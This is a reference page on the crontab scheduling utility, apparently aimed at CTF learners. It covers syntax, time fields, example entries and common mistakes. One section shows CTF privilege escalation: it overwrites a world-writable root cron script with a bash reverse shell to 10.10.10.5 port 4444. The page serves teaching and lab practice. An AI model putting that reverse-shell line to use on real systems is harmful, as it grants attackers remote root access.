# crontab

**Cron Table** — a command-line utility for scheduling tasks (cron jobs) to run automatically at specified times or intervals.

## Syntax

```
crontab [options]
```

## Purpose

Schedule commands or scripts to run periodically — every minute, hour, day, or at specific times. Used for system maintenance (log rotation, backups), security tasks (scheduled scans), and automation. In CTF challenges, cron jobs are often exploitable for privilege escalation.

## Common Parameters

| Parameter | Description |
|-----------|-------------|
| `-e` | Edit the current user's crontab |
| `-l` | List the current user's cron jobs |
| `-r` | Remove the current user's crontab |
| `-u <user>` | Operate on another user's crontab (root only) |
| `-i` | Prompt before removal (with `-r`) |

## Crontab Format

A crontab file has five time-and-date fields followed by the command:

```
* * * * * command_to_execute
│ │ │ │ │
│ │ │ │ └── Day of week (0-7, 0=Sun, 7=Sun)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)
```

### Special Characters

| Character | Meaning |
|-----------|---------|
| `*` | Any value (every) |
| `*/N` | Every N units |
| `N-M` | Range (e.g., `9-17`) |
| `N,M,O` | List (e.g., `1,15,30`) |

### Special Strings

| String | Equivalent | Description |
|--------|------------|-------------|
| `@reboot` | — | Run once at system startup |
| `@yearly` | `0 0 1 1 *` | Run once a year |
| `@monthly` | `0 0 1 * *` | Run once a month |
| `@weekly` | `0 0 * * 0` | Run once a week |
| `@daily` | `0 0 * * *` | Run once a day |
| `@hourly` | `0 * * * *` | Run once an hour |

## Examples

```bash
# Edit crontab (opens default editor)
crontab -e

# List current cron jobs
crontab -l

# Remove all cron jobs
crontab -r

# View crontab for another user (root)
sudo crontab -u www-data -l
```

### Common Cron Entries

```cron
# Every minute (useful for testing)
* * * * * /home/user/script.sh

# Every hour at minute 0
0 * * * * /usr/local/bin/backup.sh

# Every day at 2:30 AM
30 2 * * * /root/daily_report.sh

# Every Monday at 5:00 PM
0 17 * * 1 /scripts/weekly_update.sh

# Every 15 minutes
*/15 * * * * /home/user/check_status.sh

# First day of every month at midnight
0 0 1 * * /scripts/monthly_cleanup.sh

# Twice a day (9:00 AM and 5:00 PM)
0 9,17 * * * /scripts/twice_daily.sh

# Every weekday (Mon-Fri) at 8 AM
0 8 * * 1-5 /scripts/workday_start.sh

# At reboot
@reboot /home/user/start_service.sh
```

## CTF Privilege Escalation via Cron

```bash
# Check for cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# Watch for running cron jobs
watch -n 1 "ls -la /tmp"

# If a cron job runs a world-writable script:
# 1. Find the cron job
cat /etc/crontab
# 2. Check the script permissions
ls -la /usr/local/bin/backup.sh
# 3. If world-writable, replace with reverse shell
echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' >> /usr/local/bin/backup.sh
```

## Common Mistakes

- Not using absolute paths — cron runs with a minimal PATH environment (`/usr/bin:/bin`). Always use full paths.
- Forgetting that cron jobs run with the user's limited environment — no terminal, no X11, no `$DISPLAY`.
- Not redirecting output — cron sends output as email. Add `>/dev/null 2>&1` to suppress, or `>>/var/log/script.log 2>&1` to log.
- Editing crontab with a text editor directly (`nano /etc/crontab`) instead of `crontab -e` — using `crontab` validates syntax before saving.
- Not checking for white space differences — each field must be space-separated; tabs sometimes cause issues.

## Real-World Usage

- **System automation:** Schedule backups, updates, log rotation, health checks.
- **CTF privilege escalation:** Exploit world-writable scripts executed by root cron jobs.
- **Security monitoring:** Run periodic vulnerability scans or integrity checks.
- **Data processing:** Schedule ETL jobs, report generation.
- **Certificate renewal:** Automate Let's Encrypt certificate renewal.

## Compatibility

| OS | Support | Notes |
|----|---------|-------|
| Linux | Full | Pre-installed (cron daemon) |
| Windows | N/A | Use Task Scheduler |
| macOS | Full | Pre-installed (launchd is modern, cron still works) |

```bash
# Ensure cron daemon is running
sudo systemctl enable --now cron

# Crontab is typically pre-installed
```
